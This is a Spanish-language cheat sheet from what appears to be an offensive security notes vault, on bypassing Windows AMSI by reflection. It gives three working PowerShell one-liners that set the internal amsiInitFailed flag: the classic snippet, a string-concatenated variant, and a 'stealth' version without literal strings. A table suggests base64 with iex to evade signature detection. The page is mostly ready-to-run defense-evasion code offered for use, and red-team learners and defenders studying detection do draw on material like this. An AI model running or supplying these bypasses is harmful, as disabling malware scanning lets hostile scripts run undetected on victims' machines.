---
aliases:
  - amsiInitFailed
  - AMSI Reflection Bypass
tags:
  - technique/defense-evasion
  - env/windows
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AMSI Bypasses]]"
---
# AMSI Bypasses - Reflection (amsiInitFailed)

> Setea el flag interno `amsiInitFailed=true` vía reflection → PowerShell skipea scans subsiguientes. Lo más simple, pero el snippet clásico está **firmado** → hay que ofuscar.

---

## Técnicas

| **Técnica** | **Qué hace** | **Cuándo** |
|:---|:---|:---|
| Classic (Matt Graeber) | Setea `amsiInitFailed=true` — ver code | Defender sin EDR moderno. |
| Reorder/concat de strings | Rompe la firma del classic | String signature bloqueada. |
| Base64 + `iex` | Oculta el payload en base64 | Evadir grep de strings. |
| One-liner rastamouse | Itera tipos/fields sin nombres literales | Reflection-proof contra firmas estáticas. |
^amsi-reflection

### Classic (firmado, ofuscar)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Variante ofuscada (concat)

```powershell
$a='System.Management.Automation.A';$b='msiUtils'
[Ref].Assembly.GetType("$a$b").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### One-liner stealth (rastamouse — sin strings literales)

```powershell
$A=[Ref].Assembly.GetTypes();Foreach($B in $A){if($B.Name -like "*iUtils"){$C=$B}};$D=$C.GetFields('NonPublic,Static');Foreach($E in $D){if($E.Name -like "*Failed"){$F=$E}};$F.SetValue($Null,$True)
```

> [!warning] Solo el proceso actual
> Afecta únicamente la sesión PowerShell donde corre. No es persistente ni global. Defender moderno detecta el classic por firma → usar la variante stealth o pasar a [[AMSI Bypasses - Memory Patch]].
